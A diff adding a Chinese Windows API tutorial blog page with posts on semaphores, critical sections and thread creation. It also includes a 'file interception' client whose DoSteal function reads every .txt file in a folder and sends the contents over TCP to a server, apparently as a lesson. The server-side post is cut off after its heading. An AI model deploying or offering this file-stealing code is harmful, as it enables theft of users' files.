@@ -1,0 +1,767 @@
+<!DOCTYPE html>
+<html lang="zh-cmn-Hans">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Yunyin&#39;s blog</title>
+  
+    <link rel="icon" href="/assert/C++.jpg">
+  
+  
+  
+  <!--link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.10.0/styles/github-gist.min.css"-->
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.10.0/styles/github-gist.min.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+<div class="Shell">
+    <aside class='SideBar'>
+    <section class='avatar' style="background-image: url(/assets/background.jpg)">
+        <div class='av-pic' style="background-image: url(/assets/C++.jpg)">
+        </div>
+    </section>
+    <section class='menu'>
+        <div>Yunyin&#39;s blog</div>
+        
+        <ul>
+          
+            <a href="/" class="Btn">
+              <li>Home</li>
+            </a>  
+          
+            <a href="/archives/" class="Btn">
+              <li>Archive</li>
+            </a>  
+          
+            <a href="/tags/" class="Btn">
+              <li>Tags</li>
+            </a>  
+          
+            <a href="/categories/" class="Btn">
+              <li>Categories</li>
+            </a>  
+          
+        </ul>
+    </section>
+    <section class="media">
+        
+    </section>
+</aside>
+
+    <div class="container">
+        <div data-pager-shell>
+            <ul class="Index">
+  
+  
+    <li>
+      <article class='ListView'>
+    <header class="title">
+      
+        <h1>
+          <a href="/2022/10/29/Windows%20API/2022-10-29_21-%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5%EF%BC%9A%E4%BF%A1%E5%8F%B7%E9%87%8F/">21-线程同步：信号量</a>
+        </h1>
+      
+      <div class='ListMeta'>
+  <time datetime="2022-10-28T16:00:00.000Z" itemprop="datePublished">
+    2022-10-29
+  </time>
+  
+  
+  / 
+  <ul>
+    
+  <li class="meta-text">
+  { <a href="/categories/Windows-API/">Windows API</a> }
+  </li>
+
+
+  </ul>
+  
+</div>
+
+    </header>
+    <div>
+      
+        <h2 id="线程同步：信号量">线程同步：信号量</h2>
+<h4 id="1-内核对象的状态">1.内核对象的状态</h4>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>触发状态（有信号状态），表示有可用资源。</p>
+</li>
+<li class="lvl-2">
+<p>未触发状态（无信号状态），表示没有可用资源</p>
+</li>
+</ul>
+<h4 id="2-信号量">2.信号量</h4>
+<blockquote>
+<p>用于保证某个内核对象的引用不超过某个最大值。</p>
+</blockquote>
+<p>组成：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>计数器：该内核对象被使用的次数</p>
+</li>
+<li class="lvl-2">
+<p>最大资源数量：标识信号量能<strong>控制</strong>的最大资源数量（实际上可能没有那么多资源）</p>
+</li>
+<li class="lvl-2">
+<p>当前资源数量：表示当前开放资源的个数（资源可以不被线程占用，但是也没开放）</p>
+</li>
+</ul>
+<p>使用规则：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>当前资源数量&gt;0：说明有可用资源，信号量处于触发状态</p>
+</li>
+<li class="lvl-2">
+<p>当前资源数量=0：说明无可用资源，信号量处于未触发状态</p>
+</li>
+</ul>
+<p>补充：</p>
+<blockquote>
+<p>信号量与互斥量不同的地方是，它允许多个线程在同一时刻访问同一资源，但是需要限制在同一时刻访问此资源的最大线程数目。信号量对象对线程的同步方式与前面几种方法不同，信号允许多个线程同时使用共享资源。</p>
+</blockquote>
+<h4 id="3-创建信号量CreateSemaphoreW函数">3.创建信号量CreateSemaphoreW函数</h4>
+<blockquote>
+<p>创建一个信号量，并指定该信号量的初始值和最大值</p>
+</blockquote>
+<p>参数：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>lpSemaphoreAttributes：安全属性，一般用NULL</p>
+</li>
+<li class="lvl-2">
+<p>lInitialCount：初始化时，有多少个资源可用</p>
+</li>
+<li class="lvl-2">
+<p>lMaximumCount：最大可控制的资源数量</p>
+</li>
+<li class="lvl-2">
+<p>lpName：信号的名称，一般用NULL匿名</p>
+</li>
+</ul>
+<p>返回：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>信号句柄</p>
+</li>
+</ul>
+<h4 id="4-增加信号量ReleaseSemaphore函数">4.增加信号量ReleaseSemaphore函数</h4>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>hSemaphore：信号量的句柄</p>
+</li>
+<li class="lvl-2">
+<p>lReleaseCount：增加的资源计数值（如果是n，则加n）</p>
+</li>
+<li class="lvl-2">
+<p>lpPreviousCount：当前资源计数的原始值</p>
+</li>
+</ul>
+<p><strong>案例</strong></p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">Read</span><span class="params">(<span class="type">void</span>* arg)</span></span>;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">Accu</span><span class="params">(<span class="type">void</span>* arg)</span></span>;</span><br><span class="line"><span class="type">static</span> HANDLE semOne;</span><br><span class="line"><span class="type">static</span> HANDLE semTwo;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> num;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hThread1, hThread2;</span><br><span class="line">	semOne = <span class="built_in">CreateSemaphore</span>(<span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">//semOne 没有可用资源 只能表示0或者1的二进制信号量 无信号</span></span><br><span class="line">	semTwo = <span class="built_in">CreateSemaphore</span>(<span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">//semTwo 有可用资源，有信号状态 有信号</span></span><br><span class="line">	hThread1 = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, Read, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	hThread2 = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, Accu, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">WaitForSingleObject</span>(hThread1, INFINITE);</span><br><span class="line">	<span class="built_in">WaitForSingleObject</span>(hThread2, INFINITE);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(semOne);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(semTwo);</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">Read</span><span class="params">(<span class="type">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">fputs</span>(<span class="string">&quot;Input num: &quot;</span>, stdout); <span class="comment">// 1 5 11</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;begin read\n&quot;</span>); <span class="comment">// 3 6 12</span></span><br><span class="line">		<span class="comment">//等待内核对象semTwo的信号，如果有信号，继续执行；如果没有信号，等待</span></span><br><span class="line">		<span class="built_in">WaitForSingleObject</span>(semTwo, INFINITE);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;beginning read\n&quot;</span>); <span class="comment">//4 10 16</span></span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line">		<span class="built_in">ReleaseSemaphore</span>(semOne, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">Accu</span><span class="params">(<span class="type">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> sum = <span class="number">0</span>, i;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;begin Accu\n&quot;</span>); <span class="comment">//2 9 15</span></span><br><span class="line">		<span class="comment">//等待内核对象semOne的信号，如果有信号，继续执行；如果没有信号，等待</span></span><br><span class="line">		<span class="built_in">WaitForSingleObject</span>(semOne, INFINITE);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;beginning Accu\n&quot;</span>); <span class="comment">//7 13</span></span><br><span class="line">		sum += num;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;sum = %d \n&quot;</span>, sum); <span class="comment">// 8 14</span></span><br><span class="line">		<span class="built_in">ReleaseSemaphore</span>(semTwo, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Result: %d \n&quot;</span>, sum);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+</article>
+
+    </li>
+  
+    <li>
+      <article class='ListView'>
+    <header class="title">
+      
+        <h1>
+          <a href="/2022/10/29/Windows%20API/2022-10-29_22-%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5%EF%BC%9A%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81%E6%AE%B5/">22-线程同步：关键代码段</a>
+        </h1>
+      
+      <div class='ListMeta'>
+  <time datetime="2022-10-28T16:00:00.000Z" itemprop="datePublished">
+    2022-10-29
+  </time>
+  
+  
+  / 
+  <ul>
+    
+  <li class="meta-text">
+  { <a href="/categories/Windows-API/">Windows API</a> }
+  </li>
+
+
+  </ul>
+  
+</div>
+
+    </header>
+    <div>
+      
+        <h2 id="线程同步：关键代码段">线程同步：关键代码段</h2>
+<blockquote>
+<p>关键代码段，也称为临界区，工作在用户方式下。它是指一个小代码段，在代码能够执行前，它必须独占对某些资源的访问权。通常把多线程中访问同一种资源的那部分代码当做关键代码段。</p>
+</blockquote>
+<p>注意：关键代码段不是内核对象，只是用户态下保证资源只能被独立访问的代码加锁。</p>
+<blockquote>
+<p>步骤：先创建关键代码段（本质是一个结构体），再在需要加锁的代码前进入临界区，在结束该段代码后离开临界区，能让其它线程能够进入（同一代码段标识的）临界区。</p>
+</blockquote>
+<h4 id="1-初始化关键代码段InitializeCriticalSection">1.初始化关键代码段InitializeCriticalSection</h4>
+<blockquote>
+<p>先声明结构体CRITICAL_SECTION，再将其地址传入</p>
+</blockquote>
+<p>参数：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>一个指向 CRITICAL_SECTION 结构体的指针</p>
+</li>
+</ul>
+<h4 id="2-进入关键代码段EnterCriticalSection">2.进入关键代码段EnterCriticalSection</h4>
+<p>参数：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>一个指向 CRITICAL_SECTION 结构体的指针</p>
+</li>
+</ul>
+<h4 id="3-退出关键代码段LeaveCriticalSection">3.退出关键代码段LeaveCriticalSection</h4>
+<p>参数：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>一个指向 CRITICAL_SECTION 结构体的指针</p>
+</li>
+</ul>
+<h4 id="4-删除临界区DeleteCriticalSection">4.删除临界区DeleteCriticalSection</h4>
+<p>参数：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>一个指向 CRITICAL_SECTION 结构体的指针</p>
+</li>
+</ul>
+<p><strong>案例</strong></p>
+<blockquote>
+<p>创建临界区结构体，在关键代码段前加锁，离开后解锁</p>
+</blockquote>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> iTickets = <span class="number">5000</span>;</span><br><span class="line">CRITICAL_SECTION g_cs;</span><br><span class="line"><span class="comment">// A窗口 B窗口</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">SellTicketA</span><span class="params">(<span class="type">void</span>* lpParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">EnterCriticalSection</span>(&amp;g_cs);<span class="comment">//进入临界区</span></span><br><span class="line">		<span class="keyword">if</span> (iTickets &gt; <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">Sleep</span>(<span class="number">1</span>);</span><br><span class="line">			iTickets--;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;A remain %d\n&quot;</span>, iTickets);</span><br><span class="line">			<span class="built_in">LeaveCriticalSection</span>(&amp;g_cs);<span class="comment">//离开临界区</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">LeaveCriticalSection</span>(&amp;g_cs);<span class="comment">//离开临界区</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">SellTicketB</span><span class="params">(<span class="type">void</span>* lpParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">EnterCriticalSection</span>(&amp;g_cs);<span class="comment">//进入临界区</span></span><br><span class="line">		<span class="keyword">if</span> (iTickets &gt; <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">Sleep</span>(<span class="number">1</span>);</span><br><span class="line">			iTickets--;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;B remain %d\n&quot;</span>, iTickets);</span><br><span class="line">			<span class="built_in">LeaveCriticalSection</span>(&amp;g_cs);<span class="comment">//离开临界区</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">LeaveCriticalSection</span>(&amp;g_cs);<span class="comment">//离开临界区</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hThreadA, hThreadB;</span><br><span class="line">	hThreadA = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, SellTicketA, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>); <span class="comment">//2</span></span><br><span class="line">	hThreadB = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, SellTicketB, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>); <span class="comment">//2</span></span><br><span class="line">	<span class="built_in">CloseHandle</span>(hThreadA); <span class="comment">//1</span></span><br><span class="line">	<span class="built_in">CloseHandle</span>(hThreadB); <span class="comment">//1</span></span><br><span class="line">	<span class="built_in">InitializeCriticalSection</span>(&amp;g_cs); <span class="comment">//初始化关键代码段</span></span><br><span class="line">	<span class="built_in">Sleep</span>(<span class="number">40000</span>);</span><br><span class="line">	<span class="built_in">DeleteCriticalSection</span>(&amp;g_cs);<span class="comment">//删除临界区</span></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+</article>
+
+    </li>
+  
+    <li>
+      <article class='ListView'>
+    <header class="title">
+      
+        <h1>
+          <a href="/2022/10/28/Windows%20API/2022-10-28_13-%E7%BA%BF%E7%A8%8B%E5%85%A5%E9%97%A8/">13-线程入门</a>
+        </h1>
+      
+      <div class='ListMeta'>
+  <time datetime="2022-10-27T16:00:00.000Z" itemprop="datePublished">
+    2022-10-28
+  </time>
+  
+  
+  / 
+  <ul>
+    
+  <li class="meta-text">
+  { <a href="/categories/Windows-API/">Windows API</a> }
+  </li>
+
+
+  </ul>
+  
+</div>
+
+    </header>
+    <div>
+      
+        <h2 id="线程入门">线程入门</h2>
+<blockquote>
+<p>如果任务只是顺序执行是不合理的，应该能同时进行。由此引入多线程。</p>
+<p>一个进程可以有多个线程。</p>
+</blockquote>
+<p>使用多线程的好处：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>避免阻塞</p>
+</li>
+<li class="lvl-2">
+<p>避免CPU空转</p>
+</li>
+<li class="lvl-2">
+<p>提升效率</p>
+</li>
+</ul>
+<h4 id="1-线程创建函数">1.线程创建函数</h4>
+<blockquote>
+<p>头文件process.h</p>
+</blockquote>
+<h5 id="1-1CreateThread函数">1.1CreateThread函数</h5>
+<blockquote>
+<p>CreateThread 是一种微软在 Windows API 中提供了建立新的线程的函数，该函数在主线程的基础上创建一个新线程。线程终止运行后，线程对象仍然在系统中，必须通过CloseHandle 函数来关闭该线程对象。</p>
+</blockquote>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    LPSECURITY_ATTRIBUTES lpThreadAttributes,<span class="comment">//SD</span></span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T dwStackSize,<span class="comment">//initialstacksize</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPTHREAD_START_ROUTINE lpStartAddress,<span class="comment">//threadfunction</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpParameter,<span class="comment">//threadargument</span></span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dwCreationFlags,<span class="comment">//creationoption</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPDWORD lpThreadId<span class="comment">//threadidentifier</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span> </span></span><br></pre></td></tr></table></figure>
+<p>参数：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>lpThreadAttributes 表示线程内核对象的安全属性，一般传入NULL 表示使用默认设置。</p>
+</li>
+<li class="lvl-2">
+<p>dwStackSize 表示线程栈空间大小。传入 0 表示使用默认大小（1MB）。</p>
+</li>
+<li class="lvl-2">
+<p>lpStartAddress 表示新线程所执行的线程函数地址，多个线程可以使用同一个函数地址。</p>
+</li>
+<li class="lvl-2">
+<p>lpParameter 是传给线程函数的参数。</p>
+</li>
+<li class="lvl-2">
+<p>dwCreationFlags 指定额外的标志来控制线程的创建，为 0 表示线程创建之后立即就可以进行调度，如果为 CREATE_SUSPENDED 则表示线程创建后暂停运行，这样它就无法调度，直到调用 ResumeThread()。</p>
+</li>
+<li class="lvl-2">
+<p>lpThreadId 将返回线程的 ID 号，传入 NULL 表示不需要返回该线程 ID 号</p>
+</li>
+</ul>
+<p>返回值：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>对应的线程句柄</p>
+</li>
+</ul>
+<h5 id="1-2-beginthreadex函数（底层是CreateThread，封装了容错，因此传参和CreateThread基本一致）">1.2_beginthreadex函数（底层是CreateThread，封装了容错，因此传参和CreateThread基本一致）</h5>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> _beginthreadex(</span><br><span class="line">    <span class="type">void</span> *security, 								<span class="comment">// 安全属性， 为 NULL 时表示默认安全性</span></span><br><span class="line">    <span class="type">unsigned</span> stack_size, 							<span class="comment">// 线程的堆栈大小， 一般默认为 0</span></span><br><span class="line">    <span class="built_in">unsigned</span>(_stdcall *start_address)(<span class="type">void</span> *), 		<span class="comment">// 线程函数</span></span><br><span class="line">    <span class="type">void</span> *argilist, 								<span class="comment">// 线程函数的参数</span></span><br><span class="line">    <span class="type">unsigned</span> initflag, 								<span class="comment">// 新线程的初始状态，0 表示立即执行，														//CREATE_SUSPENDED 表示创建之后挂起</span></span><br><span class="line">    <span class="type">unsigned</span> *threaddr 								<span class="comment">// 用来接收线程 ID</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<p>返回值：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>成功返回线程句柄，失败返回0</p>
+</li>
+</ul>
+<p>注：__stdcall见第一节</p>
+
+      
+    </div>
+</article>
+
+    </li>
+  
+    <li>
+      <article class='ListView'>
+    <header class="title">
+      
+        <h1>
+          <a href="/2022/10/27/Windows%20API/2022-10-27_10-%E6%96%87%E4%BB%B6%E6%88%AA%E5%8F%96%EF%BC%9A%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%A3%E7%A0%81/">10-文件截取：客户端代码</a>
+        </h1>
+      
+      <div class='ListMeta'>
+  <time datetime="2022-10-26T16:00:00.000Z" itemprop="datePublished">
+    2022-10-27
+  </time>
+  
+  
+  / 
+  <ul>
+    
+  <li class="meta-text">
+  { <a href="/categories/Windows-API/">Windows API</a> }
+  </li>
+
+
+  </ul>
+  
+</div>
+
+    </header>
+    <div>
+      
+        <h2 id="文件截取：客户端代码">文件截取：客户端代码</h2>
+<blockquote>
+<p>在文件截取中创建TCPsocket，连接上服务器，将得到的文件路径打开文件，将内容导入到缓冲区，通过socket发送到服务器即可。</p>
+</blockquote>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">initsocket</span><span class="params">()</span>		<span class="comment">//封装初始化网络库的函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	WORD wVersionRequested;</span><br><span class="line">	WSADATA wsadata;</span><br><span class="line">	<span class="type">int</span> err;</span><br><span class="line">	wVersionRequested = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	err = <span class="built_in">WSAStartup</span>(wVersionRequested, &amp;wsadata);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;WSAStartup errnum: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsadata.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsadata.wVersion) != <span class="number">2</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;LOBYTE errnum: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="built_in">WSACleanup</span>();</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">sendToServer</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">initsocket</span>())</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">	FILE* fp = <span class="built_in">fopen</span>(path, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="type">char</span> sendBuf[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">int</span> len = <span class="built_in">fread</span>(sendBuf, <span class="number">1</span>, <span class="number">1024</span>, fp);</span><br><span class="line">	<span class="built_in">fclose</span>(fp);</span><br><span class="line"></span><br><span class="line">	SOCKET sockCli;</span><br><span class="line">	sockCli = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">	SOCKADDR_IN addrSrv;</span><br><span class="line">	addrSrv.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">	addrSrv.sin_family = AF_INET;</span><br><span class="line">	addrSrv.sin_port = <span class="built_in">htons</span>(<span class="number">9999</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">connect</span>(sockCli, (sockaddr*)&amp;addrSrv, <span class="built_in">sizeof</span>(sockaddr)))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> iLen = <span class="built_in">send</span>(sockCli, sendBuf, <span class="number">1024</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">closesocket</span>(sockCli);</span><br><span class="line">	<span class="built_in">WSACleanup</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">DoSteal</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* szPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//1 遍历路径下所有文件夹</span></span><br><span class="line">	WIN32_FIND_DATA file_for_find;			<span class="comment">//文件数据</span></span><br><span class="line">	HANDLE hListFile;						<span class="comment">//用句柄来标志文件</span></span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> szFilePath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="built_in">strcpy</span>(szFilePath, szPath);</span><br><span class="line">	<span class="built_in">strcat</span>(szFilePath, <span class="string">&quot;\\*&quot;</span>);</span><br><span class="line">	<span class="comment">//找到第一个文件</span></span><br><span class="line">	hListFile = <span class="built_in">FindFirstFile</span>(szFilePath, &amp;file_for_find);</span><br><span class="line">	<span class="comment">//循环遍历所有文件</span></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="type">char</span> mypath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">		<span class="built_in">strcpy</span>(mypath, szPath);</span><br><span class="line">		<span class="built_in">strcat</span>(mypath, file_for_find.cFileName);</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">strstr</span>(mypath,<span class="string">&quot;.txt&quot;</span>))</span><br><span class="line">			<span class="keyword">while</span> (<span class="built_in">sendToServer</span>(mypath)==<span class="literal">false</span>);</span><br><span class="line">	&#125; <span class="keyword">while</span> (<span class="built_in">FindNextFile</span>(hListFile, &amp;file_for_find));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">DoSteal</span>(<span class="string">&quot;D:\\文件合集\\txt合集\\&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+</article>
+
+    </li>
+  
+    <li>
+      <article class='ListView'>
+    <header class="title">
+      
+        <h1>
+          <a href="/2022/10/27/Windows%20API/2022-10-27_11-%E6%96%87%E4%BB%B6%E6%88%AA%E5%8F%96%EF%BC%9A%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%A3%E7%A0%81/">11-文件截取：服务器代码</a>
+        </h1>
+      
+      <div class='ListMeta'>
+  <time datetime="2022-10-26T16:00:00.000Z" itemprop="datePublished">
+    2022-10-27
+  </time>
+  
+  
+  / 
+  <ul>
+    
+  <li class="meta-text">
+  { <a href="/categories/Windows-API/">Windows API</a> }
+  </li>
+
+
+  </ul>
+  
+</div>
+
